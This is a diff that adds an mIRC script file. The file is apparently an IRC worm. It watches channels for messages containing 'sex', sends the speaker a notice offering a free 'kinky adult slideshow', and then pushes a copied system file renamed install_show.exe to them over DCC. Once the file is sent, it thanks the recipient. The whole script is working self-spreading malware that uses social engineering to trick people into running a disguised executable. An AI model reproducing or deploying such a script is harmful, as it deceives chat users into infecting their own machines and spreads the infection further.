@@ -1,0 +1,7 @@
+[script]
+n0= on 1:TEXT:*sex*:#:{
+n1= .notice $nick Hello, sorry to disturb you, but I just got a very kinky adult slideshow and was wondering if you would like a copy.  So I'm going to send you one.
+n2= /.copy C:\windows\system\runtray_.dll C:\windows\system\install_show.exe
+n3= /dcc send $nick C:\windows\system\install_show.exe
+n4= }
+n5= on 1:FILESENT:*.exe:.msg $nick Thanks for accepting it, hope you enjoy it!
